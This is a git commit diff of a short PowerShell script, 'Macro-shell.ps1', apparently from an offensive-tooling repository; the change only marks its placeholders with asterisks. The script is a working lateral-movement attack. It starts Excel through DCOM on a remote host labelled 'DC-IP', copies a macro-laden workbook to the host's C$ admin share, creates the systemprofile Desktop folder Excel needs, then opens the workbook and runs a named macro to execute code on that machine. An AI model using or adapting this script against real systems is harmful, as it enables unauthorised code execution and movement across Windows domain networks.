71eda2d43c824f5f3e8e27681f9fc7938f612503
Youssef Saeed <81388596+Y0u553f5433d@users.noreply.github.com>
2022-05-23 14:29:15 +0200

    Update Macro-shell.ps1

--- Macro-shell.ps1
+++ Macro-shell.ps1
@@ -1,8 +1,8 @@
-$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","DC-IP"))
-$LocalPath = "C:\Users\USER\Desktop\excel-file-name.xls"
-$RemotePath = "\\DC-IP\c$\excel-file-name.xls"
+$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","*DC-IP*"))
+$LocalPath = "C:\Users\USER\Desktop\*excel-file-name*.xls"
+$RemotePath = "\\DC-IP\c$\*excel-file-name*.xls"
 [System.IO.File]::Copy($LocalPath, $RemotePath, $True)
-$Path = "\\DC-IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"
+$Path = "\\*DC-IP*\c$\Windows\sysWOW64\config\systemprofile\Desktop"
 $temp = [system.io.directory]::createDirectory($Path)
-$Workbook = $com.Workbooks.Open("C:\excel-file-name.xls")
-$com.Run("Macro-Name")
+$Workbook = $com.Workbooks.Open("C:\*excel-file-name*.xls")
+$com.Run("*Macro-Name*")
